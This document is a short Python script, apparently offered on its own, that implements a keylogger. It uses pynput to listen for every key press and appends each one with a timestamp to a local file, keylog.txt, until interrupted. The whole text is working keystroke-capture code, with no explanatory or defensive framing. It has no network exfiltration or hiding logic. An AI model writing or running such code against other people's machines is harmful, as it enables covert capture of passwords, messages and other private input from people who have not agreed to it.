from pynput.keyboard import Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def write_file(key):
    logging.info(str(key))

try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt as e:
    print(e)